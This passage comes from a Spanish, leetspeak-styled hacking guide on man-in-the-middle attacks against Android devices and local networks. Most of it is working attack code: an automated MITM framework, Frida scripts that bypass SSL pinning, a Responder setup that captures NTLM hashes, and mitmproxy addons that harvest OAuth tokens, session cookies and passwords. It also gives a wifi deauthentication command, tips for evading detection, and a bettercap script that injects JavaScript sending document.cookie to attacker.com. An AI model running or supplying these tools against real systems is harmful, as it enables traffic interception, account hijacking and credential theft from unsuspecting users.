bettercap -eval "net.probe on; net.show; ticker on"
```


---

<a name="7-pr0y3ct0s-pr4ct1c0s"></a>
## 7. Pr0y3ct0s Pr4ct1c0s

### Pr0y3ct0 1: M1TM Fr4m3w0rk — 4ut0m4t1z4d0r c0mpl3t0 d3 m1tm

```python
#!/usr/bin/env python3
"""
mitm_framework.py - Framework automatizado de MITM para Android
Configura proxy, certificados, y captura de tráfico en un solo comando
"""

import subprocess
import os
import sys
import json
import time
import threading
import signal
from datetime import datetime
from pathlib import Path

class MITMFramework:
    def __init__(self, interface="wlan0", proxy_port=8080, verbose=True):
        self.interface = interface
        self.proxy_port = proxy_port
        self.verbose = verbose
        self.running = False
        self.session_dir = f"mitm_session_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        self.processes = []
        
        os.makedirs(self.session_dir, exist_ok=True)
    
    def log(self, msg):
        ts = datetime.now().strftime('%H:%M:%S')
        print(f"[{ts}] {msg}")
    
    def run_cmd(self, cmd, background=False):
        if self.verbose:
            self.log(f"Ejecutando: {' '.join(cmd)}")
        
        if background:
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.processes.append(proc)
            return proc
        else:
            result = subprocess.run(cmd, capture_output=True, text=True)
            return result
    
    def check_requirements(self):
        """Verificar herramientas necesarias"""
        tools = ['adb', 'mitmproxy', 'iptables', 'ip']
        missing = []
        
        for tool in tools:
            if not subprocess.run(['which', tool], capture_output=True).returncode == 0:
                missing.append(tool)
        
        if missing:
            self.log(f"❌ Herramientas faltantes: {', '.join(missing)}")
            self.log("Instalá con: sudo apt install mitmproxy iptables adb")
            return False
        
        return True
    
    def setup_adb(self):
        """Configurar ADB y verificar dispositivo"""
        devices = self.run_cmd(['adb', 'devices', '-l'])
        
        if 'device' not in devices.stdout:
            self.log("❌ No hay dispositivos Android conectados")
            self.log("Conectá uno con USB debugging habilitado")
            return False
        
        # Obtener serial
        for line in devices.stdout.split('\n'):
            if 'device' in line and 'List' not in line:
                serial = line.split()[0]
                self.serial = serial
                self.log(f"✓ Dispositivo: {serial}")
                
                # Obtener modelo
                model = self.run_cmd(['adb', '-s', serial, 'shell', 'getprop', 'ro.product.model'])
                self.log(f"  Modelo: {model.stdout.strip()}")
                break
        
        return True
    
    def install_certificate(self):
        """Instalar certificado CA de mitmproxy en el dispositivo"""
        cert_file = f"mitmproxy-ca-cert.pem"
        
        if not os.path.exists(cert_file):
            self.log("❌ Certificado de mitmproxy no encontrado")
            self.log("Ejecutá mitmproxy primero para generarlo")
            return False
        
        # Convertir a formato Android
        self.run_cmd([
            'openssl', 'x509', '-inform', 'PEM', '-in', cert_file,
            '-outform', 'DER', '-out', 'mitmproxy-ca-cert.der'
        ])
        
        # Pushear al dispositivo
        self.run_cmd(['adb', 'push', 'mitmproxy-ca-cert.der', '/sdcard/'])
        
        # Instalar (varía según versión de Android)
        self.log("📱 Instalá el certificado manualmente:")
        self.log("  Settings → Security → Install from storage")
        self.log("  Seleccioná mitmproxy-ca-cert.der")
        self.log("  Poné un nombre (ej: MITM CA)")
        
        return True
    
    def setup_proxy_manual(self):
        """Configurar proxy manual en Android"""
        ip = self.run_cmd(['hostname', '-I']).stdout.strip().split()[0]
        
        self.log(f"\n📱 Configurá el proxy en Android:")
        self.log(f"  WiFi → Modificar red → Opciones avanzadas → Proxy → Manual")
        self.log(f"  IP: {ip}")
        self.log(f"  Puerto: {self.proxy_port}")
        
        return ip
    
    def setup_proxy_transparent(self, gateway_ip=None):
        """Configurar proxy transparente con iptables"""
        self.log("Configurando proxy transparente...")
        
        # Habilitar IP forwarding
        self.run_cmd(['sysctl', '-w', 'net.ipv4.ip_forward=1'])
        
        # Reglas iptables para redirigir HTTP/HTTPS
        self.run_cmd([
            'iptables', '-t', 'nat', '-A', 'PREROUTING',
            '-i', self.interface, '-p', 'tcp', '--dport', '80',
            '-j', 'REDIRECT', '--to-port', str(self.proxy_port)
        ])
        
        self.run_cmd([
            'iptables', '-t', 'nat', '-A', 'PREROUTING',
            '-i', self.interface, '-p', 'tcp', '--dport', '443',
            '-j', 'REDIRECT', '--to-port', str(self.proxy_port)
        ])
        
        self.log("✓ Reglas iptables aplicadas")
    
    def start_mitmproxy(self, mode='regular'):
        """Iniciar mitmproxy"""
        if mode == 'regular':
            cmd = ['mitmweb', '--listen-port', str(self.proxy_port)]
        elif mode == 'transparent':
            cmd = ['mitmweb', '--mode', 'transparent', '--listen-port', str(self.proxy_port)]
        elif mode == 'upstream':
            cmd = ['mitmweb', '--mode', f'upstream:http://127.0.0.1:{self.proxy_port}']
        
        self.log(f"Iniciando mitmproxy en puerto {self.proxy_port}...")
        proc = self.run_cmd(cmd, background=True)
        time.sleep(2)
        
        if proc.poll() is None:
            self.log("✓ mitmweb corriendo en http://127.0.0.1:8081")
            return True
        return False
    
    def start_tcpdump(self):
        """Iniciar captura de paquetes"""
        pcap_file = f"{self.session_dir}/capture.pcap"
        cmd = ['adb', 'shell', 'su', '-c', 
               f'tcpdump -i any -s 0 -w /sdcard/capture.pcap']
        proc = self.run_cmd(cmd, background=True)
        self.log(f"✓ Capturando paquetes...")
        return pcap_file
    
    def stop_tcpdump(self):
        """Detener y descargar captura"""
        self.run_cmd(['adb', 'shell', 'su', '-c', 'pkill tcpdump'])
        time.sleep(1)
        
        pcap_file = f"{self.session_dir}/capture.pcap"
        self.run_cmd(['adb', 'pull', '/sdcard/capture.pcap', pcap_file])
        self.run_cmd(['adb', 'shell', 'rm', '/sdcard/capture.pcap'])
        self.log(f"✓ Captura guardada: {pcap_file}")
        return pcap_file
    
    def start_frida_bypass(self):
        """Iniciar Frida con script de bypass de SSL pinning"""
        frida_script = """
        Java.perform(function() {
            console.log("[*] Universal SSL Pinning Bypass");
            
            // TrustManager universal
            var TrustManager = Java.registerClass({
                name: 'com.mitm.UniversalTrustManager',
                implements: [Java.use('javax.net.ssl.X509TrustManager')],
                methods: {
                    checkClientTrusted: function() {},
                    checkServerTrusted: function() {},
                    getAcceptedIssuers: function() { return []; }
                }
            });
            
            // SSLContext hook
            var SSLContext = Java.use('javax.net.ssl.SSLContext');
            SSLContext.init.implementation = function(km, tm, random) {
                var trustAll = Java.array('javax.net.ssl.TrustManager', [TrustManager.$new()]);
                this.init(km, trustAll, random);
            };
            
            // HostnameVerifier universal
            var HostnameVerifier = Java.use('javax.net.ssl.HostnameVerifier');
            var TrustAllHV = Java.registerClass({
                name: 'com.mitm.TrustAllHostnameVerifier',
                implements: [HostnameVerifier],
                methods: {
                    verify: function(hostname, session) { return true; }
                }
            });
            HttpsURLConnection = Java.use('javax.net.ssl.HttpsURLConnection');
            HttpsURLConnection.setDefaultHostnameVerifier(TrustAllHV.$new());
            
            // OkHttp3 CertificatePinner bypass
            try {
                var CertificatePinner = Java.use('okhttp3.CertificatePinner');
                CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function(hostname, pins) {
                    console.log("[*] CertificatePinner bypass: " + hostname);
                    return;
                };
            } catch(e) {}
            
            console.log("[+] SSL Pinning bypass listo!");
        });
        """
        
        script_file = f"{self.session_dir}/ssl_bypass.js"
        with open(script_file, 'w') as f:
            f.write(frida_script)
        
        self.log(f"✓ Script Frida generado: {script_file}")
        return script_file
    
    def cleanup(self):
        """Limpiar todo"""
        self.log("Limpiando...")
        
        # Matar procesos
        for proc in self.processes:
            if proc.poll() is None:
                proc.terminate()
        
        # Limpiar iptables
        self.run_cmd(['iptables', '-t', 'nat', '-F', 'PREROUTING'])
        
        # Restaurar reenvío IP
        self.run_cmd(['sysctl', '-w', 'net.ipv4.ip_forward=0'])
        
        self.log("✓ Limpieza completada")
    
    def analyze_results(self):
        """Analizar resultados de la captura"""
        pcap = f"{self.session_dir}/capture.pcap"
        if not os.path.exists(pcap):
            self.log("No hay captura para analizar")
            return
        
        self.log("\nAnalizando resultados...")
        
        # Extraer hosts visitados
        hosts = self.run_cmd([
            'tshark', '-r', pcap, '-Y', 'http.host', '-T', 'fields',
            '-e', 'http.host', '-e', 'tls.handshake.extensions_server_name'
        ])
        
        if hosts.stdout:
            unique_hosts = set()
            for line in hosts.stdout.split('\n'):
                for part in line.split('\t'):
                    if part and part not in unique_hosts:
                        unique_hosts.add(part)
            
            with open(f"{self.session_dir}/hosts.txt", 'w') as f:
                f.write('\n'.join(sorted(unique_hosts)))
            
            self.log(f"✓ {len(unique_hosts)} hosts únicos encontrados")
        
        # Buscar credenciales
        strings = self.run_cmd(['strings', pcap])
        creds_patterns = [
            'password', 'passwd', 'login', 'token', 'auth',
            'Authorization', 'Bearer', 'Basic', 'session', 'cookie'
        ]
        
        found = []
        for line in strings.stdout.split('\n'):
            for pattern in creds_patterns:
                if pattern.lower() in line.lower():
                    found.append(line)
                    break
        
        if found:
            with open(f"{self.session_dir}/credentials.txt", 'w') as f:
                f.write('\n'.join(found[:100]))
            self.log(f"⚠ {len(found)} líneas con posible info de autenticación!")
    
    def run_interactive(self):
        """Ejecutar modo interactivo"""
        if not self.check_requirements():
            return
        
        if not self.setup_adb():
            return
        
        print("\n" + "=" * 50)
        print("MITM FRAMEWORK - Menú Interactivo")
        print("=" * 50)
        print("1. Proxy manual (configurar WiFi manualmente)")
        print("2. Proxy transparente (con iptables)")
        print("3. Bridge de red (dos interfaces)")
        print("4. Solo instalar certificado")
        print("5. Solo captura tcpdump")
        print("0. Salir")
        
        choice = input("\nSeleccioná modo: ").strip()
        
        if choice == '0':
            return
        
        # Instalar certificado
        self.install_certificate()
        
        if choice == '1':
            self.start_mitmproxy('regular')
            self.setup_proxy_manual()
        elif choice == '2':
            self.start_mitmproxy('transparent')
            self.setup_proxy_transparent()
        elif choice == '4':
            return
        
        # Iniciar herramientas auxiliares
        frida_script = self.start_frida_bypass()
        pcap_file = self.start_tcpdump()
        
        self.log(f"\n{'=' * 50}")
        self.log("SESIÓN ACTIVA - Presioná Ctrl+C para detener")
        self.log(f"{'=' * 50}")
        self.log(f"mitmweb: http://127.0.0.1:8081")
        self.log(f"Script Frida: {frida_script}")
        self.log(f"Captura: {pcap_file}")
        
        def signal_handler(sig, frame):
            self.cleanup()
            self.stop_tcpdump()
            self.analyze_results()
            sys.exit(0)
        
        signal.signal(signal.SIGINT, signal_handler)
        signal.pause()

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="MITM Framework for Android")
    parser.add_argument("-i", "--interface", default="wlan0", help="Network interface")
    parser.add_argument("-p", "--port", type=int, default=8080, help="Proxy port")
    parser.add_argument("-m", "--mode", choices=["manual", "transparent", "interactive"],
                       default="interactive", help="MITM mode")
    
    args = parser.parse_args()
    
    framework = MITMFramework(args.interface, args.port)
    
    if args.mode == "interactive":
        framework.run_interactive()
    else:
        framework.check_requirements()
        framework.setup_adb()
        framework.install_certificate()
        framework.start_mitmproxy(args.mode)
        if args.mode == "transparent":
            framework.setup_proxy_transparent()
```

### Pr0y3ct0 2: SSLP1n Byp4ss H3lp3r — 4ut0m4t1z4d0r d3 Fr1d4

```bash
#!/bin/bash
# ssl_bypass_helper.sh - Automatiza el bypass de SSL Pinning en Android

APP_PACKAGE=""
FRIDA_SCRIPT=""

show_help() {
    cat << EOF
SSL Pinning Bypass Helper

USO:
  $0 <package> [script.js]

OPCIONES:
  -l, --list           Listar procesos Android
  -s, --spawn          Iniciar app desde cero
  -a, --attach         Adjuntar a app existente
  -t, --trace          Trace de funciones SSL
  -o, --objection      Usar objection en vez de Frida
  -h, --help           Mostrar ayuda

EJEMPLOS:
  $0 com.example.app
  $0 com.example.app -s
  $0 -l
  $0 com.example.app -o
EOF
    exit 1
}

# Verificar Frida server
check_frida() {
    echo "[*] Verificando Frida..."
    
    if ! command -v frida &>/dev/null; then
        echo "❌ Frida no instalado en PC"
        echo "    pip install frida-tools"
        return 1
    fi
    
    # Verificar frida-server en dispositivo
    local ps_output=$(adb shell ps 2>/dev/null | grep frida-server)
    if [ -z "$ps_output" ]; then
        echo "⚠ frida-server no está corriendo en el dispositivo"
        echo "    adb push frida-server-arm64 /data/local/tmp/"
        echo "    adb shell chmod 755 /data/local/tmp/frida-server-arm64"
        echo "    adb shell /data/local/tmp/frida-server-arm64 &"
        return 1
    fi
    
    echo "✓ Frida OK"
    return 0
}

# Bypass universal con Frida
frida_universal_bypass() {
    local script_content='
Java.perform(function() {
    console.log("[*] Universal SSL Pinning Bypass loaded");
    
    // 1. TrustManager universal
    var X509TrustManager = Java.use("javax.net.ssl.X509TrustManager");
    var SSLContext = Java.use("javax.net.ssl.SSLContext");
    
    var TrustAllManager = Java.registerClass({
        name: "com.bypass.TrustAllManager",
        implements: [X509TrustManager],
        methods: {
            checkClientTrusted: function(chain, auth) { },
            checkServerTrusted: function(chain, auth) { },
            getAcceptedIssuers: function() { return []; }
        }
    });
    
    var trustAll = [TrustAllManager.$new()];
    
    // 2. Hook SSLContext.init()
    SSLContext.init.overload(
        "[Ljavax.net.ssl.KeyManager;",
        "[Ljavax.net.ssl.TrustManager;",
        "java.security.SecureRandom"
    ).implementation = function(keyManager, trustManager, secureRandom) {
        console.log("[*] SSLContext.init() intercepted");
        this.init(keyManager, trustAll, secureRandom);
    };
    
    // 3. HostnameVerifier universal
    var HostnameVerifier = Java.use("javax.net.ssl.HostnameVerifier");
    var TrustAllHV = Java.registerClass({
        name: "com.bypass.TrustAllHV",
        implements: [HostnameVerifier],
        methods: {
            verify: function(hostname, session) {
                console.log("[*] HostnameVerifier.verify(" + hostname + ") = true");
                return true;
            }
        }
    });
    
    var HttpsURLConnection = Java.use("javax.net.ssl.HttpsURLConnection");
    HttpsURLConnection.setDefaultHostnameVerifier(TrustAllHV.$new());
    
    // 4. OkHttp CertificatePinner
    try {
        var CertificatePinner = Java.use("okhttp3.CertificatePinner");
        CertificatePinner.check.overload("java.lang.String", "java.util.List").implementation = function(host, pins) {
            console.log("[*] CertificatePinner bypass: " + host);
            return;
        };
    } catch(e) { }
    
    // 5. WebView SSL error handler
    try {
        var WebViewClient = Java.use("android.webkit.WebViewClient");
        WebViewClient.onReceivedSslError.overload(
            "android.webkit.WebView",
            "android.webkit.SslErrorHandler",
            "android.net.http.SslError"
        ).implementation = function(view, handler, error) {
            console.log("[*] WebView SSL error bypass: " + error.getUrl());
            handler.proceed();
        };
    } catch(e) { }
    
    console.log("[+] SSL Pinning bypass completado");
});
'
    
    echo "$script_content" > /tmp/ssl_bypass.js
    echo "Script guardado en /tmp/ssl_bypass.js"
}

# Listar procesos
list_processes() {
    echo "[*] Procesos Android:"
    frida-ps -U -a 2>/dev/null | head -30
}

# Main
case "${1}" in
    -l|--list)
        list_processes
        ;;
    -h|--help)
        show_help
        ;;
    *)
        APP_PACKAGE="$1"
        shift
        
        if [ -z "$APP_PACKAGE" ]; then
            show_help
        fi
        
        frida_universal_bypass
        
        # Verificar opciones
        MODE="attach"
        while [ $# -gt 0 ]; do
            case "$1" in
                -s|--spawn) MODE="spawn" ;;
                -t|--trace) TRACE=true ;;
                -o|--objection) USE_OBJECTION=true ;;
            esac
            shift
        done
        
        if [ "$USE_OBJECTION" = true ]; then
            echo "[*] Usando Objection..."
            objection -g "$APP_PACKAGE" explore --startup-command "android sslpinning disable"
        elif [ "$MODE" = "spawn" ]; then
            echo "[*] Iniciando $APP_PACKAGE con Frida..."
            frida -U -l /tmp/ssl_bypass.js -f "$APP_PACKAGE" --no-pause
        else
            echo "[*] Adjuntando a $APP_PACKAGE..."
            frida -U -l /tmp/ssl_bypass.js "$APP_PACKAGE"
        fi
        ;;
esac
```

### Pr0y3ct0 3: R3sp0nd3r + M1TMPr0xy — C4ptur4 d3 h4sh3s + 4n4l1s1s

```python
#!/usr/bin/env python3
"""
responder_mitm.py - Captura hashes NTLM y analiza tráfico automatizado
"""

import subprocess
import threading
import time
import os
import signal
import sys
from datetime import datetime

class ResponderMITM:
    def __init__(self, interface="eth0", output_dir="responder_captures"):
        self.interface = interface
        self.output_dir = output_dir
        self.processes = []
        os.makedirs(output_dir, exist_ok=True)
    
    def start_responder(self):
        """Iniciar Responder"""
        print("[*] Iniciando Responder...")
        proc = subprocess.Popen(
            ['responder', '-I', self.interface, '-wrf', '-v'],
            stdout=open(f'{self.output_dir}/responder.log', 'w'),
            stderr=subprocess.STDOUT
        )
        self.processes.append(proc)
        print(f"  PID: {proc.pid}")
        time.sleep(2)
        return proc
    
    def start_mitmproxy(self):
        """Iniciar mitmproxy para capturar tráfico"""
        print("[*] Iniciando mitmproxy...")
        proc = subprocess.Popen(
            ['mitmweb', '--listen-port', '8080', '--web-port', '8081'],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        self.processes.append(proc)
        print("  mitmweb: http://127.0.0.1:8081")
        time.sleep(2)
        return proc
    
    def monitor_responder_logs(self):
        """Monitorear logs de Responder en tiempo real"""
        log_file = f"{self.output_dir}/responder.log"
        print("[*] Monitoreando hashes capturados...")
        print("=" * 50)
        
        # Esperar a que el archivo exista
        while not os.path.exists(log_file):
            time.sleep(1)
        
        seen_hashes = set()
        
        with open(log_file, 'r') as f:
            f.seek(0, 2)  # Ir al final
            
            while True:
                line = f.readline()
                if line:
                    # Detectar hashes NTLM
                    if 'NTLM' in line or 'NTLMv2' in line or 'hash' in line.lower():
                        if line not in seen_hashes:
                            seen_hashes.add(line)
                            timestamp = datetime.now().strftime("%H:%M:%S")
                            print(f"\n[{timestamp}] ⚠ Hash capturado!")
                            print(f"  {line.strip()}")
                    
                    # Mostrar líneas relevantes
                    if 'HTTP' in line or 'SMB' in line or 'MD5' in line or 'Captured' in line:
                        print(f"  {line.strip()}")
                    
                    sys.stdout.flush()
                else:
                    time.sleep(0.5)
    
    def setup_iptables(self):
        """Configurar redirección de tráfico"""
        print("[*] Configurando iptables...")
        
        # Limpiar reglas existentes
        subprocess.run(['iptables', '-t', 'nat', '-F'])
        
        # Redirigir HTTP/HTTPS a mitmproxy
        subprocess.run([
            'iptables', '-t', 'nat', '-A', 'PREROUTING',
            '-i', self.interface, '-p', 'tcp', '--dport', '80',
            '-j', 'REDIRECT', '--to-port', '8080'
        ])
        subprocess.run([
            'iptables', '-t', 'nat', '-A', 'PREROUTING',
            '-i', self.interface, '-p', 'tcp', '--dport', '443',
            '-j', 'REDIRECT', '--to-port', '8080'
        ])
        
        # Habilitar forwarding
        subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'])
        
        print("✓ Reglas aplicadas")
    
    def cleanup(self):
        """Limpiar todo"""
        print("\n[*] Limpiando...")
        
        for proc in self.processes:
            if proc.poll() is None:
                proc.terminate()
                proc.wait()
        
        # Limpiar iptables
        subprocess.run(['iptables', '-t', 'nat', '-F'])
        subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=0'])
        
        # Mostrar resumen
        print("\n=== Resumen de la sesión ===")
        responder_log = f"{self.output_dir}/responder.log"
        if os.path.exists(responder_log):
            ntlm_count = 0
            with open(responder_log) as f:
                for line in f:
                    if 'NTLM' in line or 'hash' in line.lower():
                        ntlm_count += 1
            print(f"Hashes capturados: {ntlm_count}")
            print(f"Log completo: {responder_log}")
        
        print("✓ Limpieza completada")
    
    def run(self):
        print("=" * 50)
        print("RESPONDER + MITMPROXY - Captura Automatizada")
        print("=" * 50)
        print(f"\nInterfaz: {self.interface}")
        print(f"Sesión: {self.output_dir}")
        print("\nPresioná Ctrl+C para detener\n")
        
        # Iniciar
        self.setup_iptables()
        responder = self.start_responder()
        mitm = self.start_mitmproxy()
        
        # Monitorear
        try:
            self.monitor_responder_logs()
        except KeyboardInterrupt:
            self.cleanup()
            sys.exit(0)

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", default="eth0")
    args = parser.parse_args()
    
    mitm = ResponderMITM(args.interface)
    mitm.run()
```



### Script 34: Advanced Traffic Analyzer
```python
from mitmproxy import http
import time
from collections import defaultdict

class TrafficAnalyzer:
    def __init__(self):
        self.stats = defaultdict(lambda: {"count": 0, "bytes": 0, "methods": defaultdict(int), "status": defaultdict(int)})
        self.start_time = time.time()

    def request(self, flow: http.HTTPFlow) -> None:
        host = flow.request.host
        self.stats[host]["count"] += 1
        self.stats[host]["methods"][flow.request.method] += 1

    def response(self, flow: http.HTTPFlow) -> None:
        host = flow.request.host
        size = len(flow.response.content)
        self.stats[host]["bytes"] += size
        self.stats[host]["status"][flow.response.status_code] += 1

    def done(self):
        elapsed = time.time() - self.start_time
        print(f"\n{'='*60}")
        print(f"TRAFFIC ANALYSIS REPORT ({elapsed:.1f}s)")
        print(f"{'='*60}")
        total_req = sum(v["count"] for v in self.stats.values())
        total_bytes = sum(v["bytes"] for v in self.stats.values())
        print(f"Total requests: {total_req}")
        print(f"Total data: {total_bytes/1024:.1f} KB")
        print(f"\nTop hosts:")
        for host, data in sorted(self.stats.items(), key=lambda x: x[1]["count"], reverse=True)[:10]:
            print(f"  {host}: {data['count']} req, {data['bytes']/1024:.1f} KB")

addons = [TrafficAnalyzer()]
```

### Script 35: [http](../raw/r3d3s-f0nd4m3nt0s.md#http)/2 Inspection
```python
from mitmproxy import http
from mitmproxy.net.http.headers import assemble_content_type

class H2Inspector:
    def request(self, flow: http.HTTPFlow) -> None:
        if flow.request.http_version == "HTTP/2":
            print(f"[H2] {flow.request.method} {flow.request.pretty_url}")
            # H2 specific headers
            for name, val in flow.request.headers:
                print(f"  {name}: {val}")

addons = [H2Inspector()]
```

### Script 36: [oauth](../raw/hybr1d-1d3nt1ty.md#oauth) Token Capture
```python
from mitmproxy import http
import re

class OAuthCapture:
    OAUTH_PATTERNS = [
        r'access_token=[^&]+',
        r'id_token=[^&]+',
        r'refresh_token=[^&]+',
        r'token_type=[^&]+',
        r'expires_in=[^&]+',
        r'code=[^&]{20,}',
        r'state=[^&]{10,}',
    ]

    def request(self, flow: http.HTTPFlow) -> None:
        url = flow.request.pretty_url
        body = flow.request.get_text() or ""
        for pattern in self.OAUTH_PATTERNS:
            match = re.search(pattern, url + "&" + body)
            if match:
                print(f"[OAUTH] {match.group()}")

addons = [OAuthCapture()]
```

### Script 37: [graphql](../raw/4p1-s3cur1ty.md#graphql) Introspection
```python
from mitmproxy import http
import json

class GraphQLInspector:
    def request(self, flow: http.HTTPFlow) -> None:
        body = flow.request.get_text() or ""
        if "query" in body or "mutation" in body or "subscription" in body:
            print(f"[GraphQL] {flow.request.pretty_url}")
            try:
                data = json.loads(body)
                if "query" in data:
                    print(f"  Query: {data['query'][:200]}")
            except:
                pass

addons = [GraphQLInspector()]
```

### Script 38: Session Hijack Tool
```python
from mitmproxy import http
import re

class SessionHijack:
    SESSION_KEYS = ["sessionid", "session", "sid", "PHPSESSID", "ASPSESSIONID", "JSESSIONID", "connect.sid", "token"]

    def request(self, flow: http.HTTPFlow) -> None:
        for name, value in flow.request.cookies.fields:
            name_lower = name.lower()
            if any(k in name_lower for k in self.SESSION_KEYS):
                print(f"[SESSION] {name}={value} @ {flow.request.host}")

    def response(self, flow: http.HTTPFlow) -> None:
        cookies = flow.response.headers.get_all("set-cookie")
        for cookie in cookies:
            for key in self.SESSION_KEYS:
                if key in cookie.lower():
                    print(f"[SESSION-SET] {cookie} @ {flow.request.host}")

addons = [SessionHijack()]
```

### Script 39: MQTT over WebSocket Capture
```python
from mitmproxy import http

class MQTTCapture:
    def websocket_message(self, flow):
        msg = flow.messages[-1]
        if len(msg.content) > 0:
            packet_type = msg.content[0] >> 4
            types = {1: "CONNECT", 2: "CONNACK", 3: "PUBLISH", 4: "PUBACK", 8: "SUBSCRIBE", 9: "SUBACK", 10: "UNSUBSCRIBE", 12: "PINGREQ", 13: "PINGRESP", 14: "DISCONNECT"}
            ptype = types.get(packet_type, f"UNKNOWN({packet_type})")
            dir = "->" if msg.from_client else "<-"
            print(f"[MQTT] {dir} {ptype}")

addons = [MQTTCapture()]
```

### Script 40: Credential Reuse Detector
```python
from mitmproxy import http
from collections import defaultdict

class CredReuseDetector:
    def __init__(self):
        self.credentials = defaultdict(set)

    def request(self, flow: http.HTTPFlow) -> None:
        if flow.request.method == "POST":
            body = flow.request.get_text()
            import re
            users = re.findall(r'user[name]*[=:][^&\s]+', body, re.I)
            passes = re.findall(r'pass[word]*[=:][^&\s]+', body, re.I)
            for u in users:
                for p in passes:
                    cred = f"{u}:{p}"
                    host = flow.request.host
                    if host not in self.credentials or cred not in self.credentials[host]:
                        print(f"[CRED-REUSE] {cred} @ {host}")

addons = [CredReuseDetector()]
```


### [bettercap](../raw/m1tm-m0b1l3.md#bettercap) Advanced Modules

**BLE (Bluetooth Low Energy) Scanning:**
```
sudo bettercap -eval "ble.recon on; ble.show"
```

**[wifi](../raw/w1f1-4tt4cks.md) [deauthentication](../raw/w1f1-4tt4cks.md#deauthentication-attack):**
```
sudo bettercap -eval "wifi.recon on; wifi.show; wifi.deauth 00:11:22:33:44:55"
```

**HTTP/[https](../raw/r3d3s-f0nd4m3nt0s.md#https) [proxy](../raw/r3d3s-f0nd4m3nt0s.md#proxy) [scripting](../raw/pyth0n-f0r-h4ck1ng.md#scripting) (Bettercap JS):**
```javascript
// bettercap_advanced.js
function onLoad() {
    console.log("Bettercap Advanced Script loaded");
}

function onHTTPreq(req) {
    // Modificar User-Agent
    req.SetHeader("User-Agent", "Mozilla/5.0 MITM");
    // Loggear todo
    console.log("REQ: " + req.Host + req.Path);
    return req;
}

function onResponse(res) {
    // Inyectar en paginas HTML
    if (res.ContentType.indexOf("html") >= 0) {
        var payload = '<script>fetch("http://attacker.com/beacon?id="+btoa(document.cookie))</script>';
        res.Body = res.Body.replace("</head>", payload + "</head>");
    }
    return res;
}
```

### Captura de trafico [udp](../raw/r3d3s-f0nd4m3nt0s.md#udp) ([dns](../raw/r3d3s-f0nd4m3nt0s.md#dns), [dhcp](../raw/r3d3s-f0nd4m3nt0s.md#dhcp), etc)
```
# Con bettercap
sudo bettercap -eval "set net.sniff.verbose true; net.sniff on"

# Con tcpdump filtrado
tcpdump -i eth0 -n -v port 53  # DNS queries
tcpdump -i eth0 -n -v port 67 or port 68  # DHCP
tcpdump -i eth0 -n -v port 161  # SNMP
tcpdump -i eth0 -n -v port 514  # Syslog
```

### Evasion de deteccion de [mitm](../raw/m1tm-m0b1l3.md)

```
# No romper la conectividad del target
# No modificar TTL de los paquetes (delata MITM)
# Usar MAC spoofing para no revelar identidad

# Detectar si estan vigilando:
# Verificar puertos sospechosos abiertos
# Verificar interfaces en modo promiscuo
ip link | grep PROMISC

# Verificar procesos de sniffing
ps aux | grep -E "tcpdump|wireshark|bettercap|arpspoof|mitmproxy"
```


---

*Documento generado para fines educativos y de investigación en seguridad.*
*Versión: 3.0 — MITM Móviles + Proyectos Prácticos*
*Última actualización: Mayo 2026*

### Herramientas adicionales

- **Bettercap:** Framework completo de MITM
- **Ettercap:** Clasico [arp](../raw/r3d3s-f0nd4m3nt0s.md#arp) poisoning
- **[responder](../raw/w1nd0ws-p0st3xpl01t.md#responder):** Captura [nbt-ns](../raw/w1nd0ws-p0st3xpl01t.md#llmnr-nbt-ns)-[nbt-ns](../raw/w1nd0ws-p0st3xpl01t.md#llmnr-nbt-ns))/[llmnr](../raw/w1nd0ws-p0st3xpl01t.md#llmnr-nbt-ns)
- **Evilginx:** [phishing](../raw/ph1sh1ng.md) con reverse proxy
- **Modlishka:** Reverse proxy automatico
- **[burp suite](../raw/w3b-h4ck1ng.md#burp-suite):** Proxy web profesional
- **ZAP:** Proxy web open source

